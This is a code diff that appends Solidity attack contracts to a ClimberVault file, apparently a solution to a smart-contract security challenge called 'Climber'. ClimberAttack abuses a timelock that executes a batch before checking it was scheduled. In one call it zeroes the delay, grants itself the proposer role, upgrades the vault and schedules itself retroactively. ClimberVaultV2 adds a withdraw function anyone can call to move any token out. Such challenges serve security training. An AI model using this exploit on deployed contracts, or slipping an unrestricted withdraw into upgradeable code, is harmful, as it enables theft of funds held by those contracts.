@@ -78,3 +78,74 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
     // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
     function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
 }
+
+contract ClimberAttack {
+
+    address payable private timeLockContract;
+    address private climberVaultAddress;
+    address private climberVaultV2Address;
+
+    address[] private targets;
+    uint256[] private values = [0, 0, 0, 0];
+    bytes[] private dataElements;
+
+    constructor(
+        address payable _timeLockContract,
+        address _climberVaultAddress,
+        address _climberVaultV2Address
+    ) {
+        timeLockContract = _timeLockContract;
+        climberVaultAddress = _climberVaultAddress;
+        climberVaultV2Address = _climberVaultV2Address;
+    }
+
+    function _initValuesForAttack() private {
+
+        targets.push(timeLockContract);
+        targets.push(timeLockContract);
+        targets.push(climberVaultAddress);
+        targets.push(address(this));
+
+        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
+        dataElements.push(abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)));
+        dataElements.push(abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeTo.selector,
+            climberVaultV2Address
+        ));
+        dataElements.push(abi.encodeWithSelector(
+            this.scheduleAction.selector,
+            timeLockContract,
+            climberVaultAddress,
+            climberVaultV2Address
+        ));
+    }
+
+    function attack() external {
+        _initValuesForAttack();
+
+        ClimberTimelock(timeLockContract).execute(
+            targets,
+            values,
+            dataElements,
+            0
+        );
+    }
+
+    function scheduleAction() external {
+        ClimberTimelock(timeLockContract).schedule(
+            targets,
+            values,
+            dataElements,
+            0
+        );
+    }
+
+}
+
+contract ClimberVaultV2 is ClimberVault {
+
+    function withdrawAttack(address tokenAddress, address recipient, uint256 amount) external {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(recipient, amount), "Transfer failed");
+    }
+}
